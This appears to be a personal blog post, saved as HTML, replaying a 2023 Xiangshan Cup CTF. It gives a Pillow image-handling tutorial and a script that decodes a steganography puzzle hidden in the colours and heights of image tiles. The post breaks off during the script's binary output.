@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Juana_2u">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://juana-2u.github.io/2023/10/18/2023xiangshan-replay/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="MISCPINTUSTU：图片隐写使用python库：pillow&amp;PIL 安装 1pip install Pillow  使用方法  使用open加载图片 123456789101112from PIL import Imageim &#x3D; Image.open(&amp;#x27;Mycat.jpg&amp;#x27;) #im是一个Image对象，属性有format，size，mode#format是格">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023香山杯复现与学习[231016]">
+<meta property="og:url" content="https://juana-2u.github.io/2023/10/18/2023XiangShan-Replay/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="MISCPINTUSTU：图片隐写使用python库：pillow&amp;PIL 安装 1pip install Pillow  使用方法  使用open加载图片 123456789101112from PIL import Imageim &#x3D; Image.open(&amp;#x27;Mycat.jpg&amp;#x27;) #im是一个Image对象，属性有format，size，mode#format是格">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/2023XiangShan-Replay.assets/Untitled.png">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/2023XiangShan-Replay.assets/cmd.png">
+<meta property="article:published_time" content="2023-10-18T12:02:45.000Z">
+<meta property="article:modified_time" content="2023-11-09T12:04:43.270Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf_Replay">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://juana-2u.github.io/Post_images/2023XiangShan-Replay.assets/Untitled.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/ico.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/ico.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/ico.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2023香山杯复现与学习[231016] -
+        
+        Juana_2u
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"juana-2u.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["记录来时的路"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":"#FF5722"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Juana_2uのhappyworld","subtitle":{"text":["BEING HAPPY IS THE MOST IMPORTANT!!"," I have a dream!","Sometimes you have to trust your gut.","If you start at the bottom,pay your dues,life here can be a dream come true.","Loading..."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":"https://www.zhihu.com/people/fawn-16-32","twitter":null,"email":"2530624471@qq.com# your email","bilibili":"https://space.bilibili.com/440820814?spm_id_from=333.1007.0.0"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"An der schönen blauen Donau,Walzer,op.314","artist":"Johann Strauss II","url":"https://open.spotify.com/embed/track/5odlY52u43F5BjByhxg7wg?utm_source=generator","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"},{"name":"City of Stars","artist":"Ryan Gosling,Emma Stone","url":"https://open.spotify.com/embed/track/1xk2Z84gbcn4tPXiiutxzS?utm_source=generator","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"},{"name":"Stray sheep","artist":"Kenshi Yonezu","url":"https://open.spotify.com/track/0iniTNHwqBiP4UDE1dgUpD?si=94e55cca33114e88","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user"},"tags":{"icon":"fa-solid fa-tags","path":"/tags/","categories":{"icon":"fa-solid fa-folder","path":"/categories/"},"Links":{"icon":"fa-regular fa-link"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/5/10 23:30:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Juana_2u
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags/"  >
+                                    
+                                        
+                                            <i class="fa-solid fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags/"  >
+                             
+                                
+                                    <i class="fa-solid fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">2023香山杯复现与学习[231016]</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header flex flex-row gap-2 items-center">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Juana_2u</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">记录来时的路</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-10-18 20:02:45</span>
+        <span class="mobile">2023-10-18 20:02:45</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-09 20:04:43</span>
+            <span class="mobile">2023-11-09 20:04:43</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf-Replay/">ctf_Replay</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PINTU"><a href="#PINTU" class="headerlink" title="PINTU"></a>PINTU</h2><h3 id="STU：图片隐写"><a href="#STU：图片隐写" class="headerlink" title="STU：图片隐写"></a>STU：图片隐写</h3><p>使用python库：pillow&amp;PIL</p>
+<p>安装</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure></div>
+
+<p>使用方法</p>
+<ol>
+<li><p>使用open加载图片</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>) <span class="comment">#im是一个Image对象，属性有format，size，mode</span></span><br><span class="line"><span class="comment">#format是格式，size是元组，表示宽和高，mode是图片的模式</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> im.<span class="built_in">format</span>, im.size,im.mode</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#console输出如下：</span></span><br><span class="line">JPEG(<span class="number">245</span>,<span class="number">280</span>) RGB</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>使用show来调试和测试，呈现图片</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>图片的读写操作</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">infile = <span class="string">&#x27;Mycat.jpg&#x27;</span></span><br><span class="line">f,e = os.path.splitext(infile)</span><br><span class="line">outfile = f + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">Image.<span class="built_in">open</span>(infile).save(outfile)</span><br><span class="line"><span class="keyword">except</span> IOError</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cannot convert&quot;</span>,infile</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#image.open() 读文件</span></span><br><span class="line"><span class="comment">#image.save() 保存文件  save方法来进行图片的格式转换</span></span><br><span class="line"><span class="comment">#os模块中的os.path.splitext() 方法可以讲文件名和拓展名分离开，图片的格式转换</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>图片的操作</p>
+<ol>
+<li><p>图片剪切</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">150</span>,<span class="number">150</span>,<span class="number">245</span>,<span class="number">280</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line">region.show()</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#crop() 方法来从图片中剪切一块区域，上面是提取矩形</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>图片黏贴</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">50</span>,<span class="number">50</span>,<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line"><span class="comment">#逆转180到原来位置</span></span><br><span class="line">region = region.transpose(Image.ROTATE_180)</span><br><span class="line">im.paste(region,box)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+</li>
+<li><p>图像序列</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">form PIL <span class="keyword">import</span> image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;cat.gif&quot;</span>)</span><br><span class="line">im.seek(<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"><span class="keyword">except</span> EOFError</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#GIF多帧图片，即序列文件，PIL自动打开序列文件的第一帧，seek和tell方法在不同帧移动</span></span><br><span class="line"><span class="comment">#tell--&gt;帧数 seek--&gt;取当前帧数</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#while循环</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;cat.gif&quot;</span>)</span><br><span class="line">im.seek(<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"><span class="keyword">except</span> EOERROr</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#for循环 ImageSequence模块的Iterator方法</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageSequence</span><br><span class="line"> </span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;cat.gif&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> ImageSequence.Iterator(im):</span><br><span class="line">frame.show()</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>读取像素和修改像素</p>
+</li>
+</ol>
+<hr>
+<h3 id="EXP1：PINTU"><a href="#EXP1：PINTU" class="headerlink" title="EXP1：PINTU"></a>EXP1：PINTU</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">r&quot;./pintu&quot;</span></span><br><span class="line">file_list = os.listdir(path) <span class="comment">#路径下的所有文件</span></span><br><span class="line">size_list = []</span><br><span class="line"></span><br><span class="line">bin_data = <span class="string">&quot; &quot;</span> <span class="comment">#获取二进制</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4704</span>):</span><br><span class="line">    im_path = path +<span class="string">f&quot;\&#123;i&#125;.png&quot;</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(im_path)</span><br><span class="line"></span><br><span class="line">    size = im.size</span><br><span class="line">    size_list.append(size[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    pixel = im.getpixel((<span class="number">0</span>,<span class="number">0</span>)) <span class="comment">#获取图像中的像素的RGB颜色值 getpixel的参数是一个像素点的坐标</span></span><br><span class="line">    <span class="comment"># RGB模式(RED，GREEN，BLUE) （0，0）表示像素点的坐标</span></span><br><span class="line">    <span class="keyword">if</span> pixel ==(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>):    <span class="comment">#二进制白色是0</span></span><br><span class="line">        bin_data += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bin_data +=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;BIN_DATA:&quot;</span>,bin_data) <span class="comment">#打印二进制</span></span><br><span class="line">int_data = <span class="built_in">int</span>(bin_data,<span class="number">2</span>) <span class="comment">#解码二进制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;INT_DATA:&quot;</span>,int_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DATA_OUT:&quot;</span>,long_to_bytes(int_data).decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">size_data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(size_list)):</span><br><span class="line">    size_data += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(size_list[i]),<span class="number">8</span>)) <span class="comment">#高度size 10进制改为8进制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SIZE_DATAL:&quot;</span>,size_data)</span><br><span class="line"></span><br><span class="line">data = size_data.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">data_out = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data_out += <span class="built_in">chr</span>(<span class="built_in">int</span>(data[i]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DATA_OUT:&quot;</span>,data_out)</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">D:\CollegeStudy\Python_code\venv\Scripts\python.exe D:/CTF_Tools/CTF_Scripts/MISC/PINTU.py</span><br><span class="line">BIN_DATA:  <span class="number">11001100110110001100001011001111110011110011100100010111110010110001000101100000011011000110110001101100110001111100110100110001010111111100100101110001000110111100110100110001010111111100111100010011011100111100101100010001010101111100101100001011011010011100101101001011000101111101111101111001000110011100101101111101000100011100101100011111010111111100110100000111001110001100110011011000110000101100111111001011011100110110110111001001011100010001101111001011001110010101000111010001011111110011001111000111000000010000010111011111011110010001000111001111000101110010111111001011010010010110100111001001011111110011101111001011001000110111101111011111011110010001001111011111011110010001100111001101001011110100010111001111000010010110110111010001011010110110000111001011000100010110000111001001011101010000110111010001011111110011001111010011000011110001100111011111011110010001100111010011000001010100011111001101000100010010001111001001011100110011111111001111011101110011001111001001011100010000000111001001011100010101010111010011000000010011010111001011000010110110011111001111001101010000100111001011000010110110011111010011001010010101110111001001011111110100001111001101000000110101111111001101000101110111111111001011000111010111011111001011001000010100111111011111011110010001100111001011000111010111011111001101000100110111110111001011000100010110000111001111001110010011111111001101010110110100011111001111001101010000100011001100110110001100001011001111110010110010000101001111110111110111100100110100111001101010101011101100110001101110101001101010111001001100111010100110110010101000001011011010100101001010001010000110110011001100100010110000111010001000101010011010100101101001001010000100011100100110001010011000110101000110011011011100110100101001111011011110011010001101000011110010101011000110000011000100010111100110010011000010111101001110000011110000011100001001000011100010101101001010000001101100111011101101011001101110100011101001110011011000101010001000110010110010100010001010010001010110101011100100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000011100101100100111000111011101111101111001000110011100101101011111011100111100100101110101000011011100011100000001000001011100110100010111011111111101000101101011011000011100100101110011000101111100101100010011000110111100111100111001000101111100100101110001000000011100111100111001000101111100110100010001001000111100111101100101011111011100101101111111000001111100110100011001001000111101001100000001000100111100111100110101000010011100111101011001001000111101000101011111001110111100101100100001010011111101111101111001001101011100111100011001000111011100100101110101011101011100110100010011001001111100111100011001000111011101111101111001000110011100110100111001001110111100111100010111001000011100111100010111011100011100101101111001000000011100110100111101010101011101111101111001000110011100010100000001001110011100111101000001011000011100010100000001001110111100101100111001011000011100100101110001000000011100101101000111011000011100110100111101010101011100101100100111000110111100100101110011000101111100101100100001000111011100111100011001000111011100100101110101011101011100110101011011011101111100100101110101000011011100011100000001000001011100111100010111001000011100111100010111011100011100101100011111000100111100111100111011000000011101000100001011011000011101111101111001000110011100101100001101011011111100111101011001001000111100100101110001000000011100101101000111011000011101111101111001001101000001010111000101000000010011100111001101011001010100001111001101000001110110011111001011000100010110000111001011001000010100111111011111011110010001100111001101000100010010001111001101001100010101111111001011000111110001101111001011011000010000100111001011011110010100111111000111000000010000010111000101000000010011101111001011010010110111101111001001011100010001101111001011010010110111101111001111010110010010001111011111011110010001100001000001110011010011100100010011110011010110010101000011110011010011100100010011110011010000100100111111110100010100111100010011110010010111000100000001110010110010011100001101110010110010111101001101110111110111100100011001110010110100100101001111110100010000100100100011110011010011011101101001110011010111000100001011110011010011001101100001110010010111010100001101110001110000000100000101110000010111000100001011101010110011110111000101000000010100010111011111011101110001100111000101000000010100010110101011001111000100000111000001011100010010101</span></span><br><span class="line">INT_DATA: <span 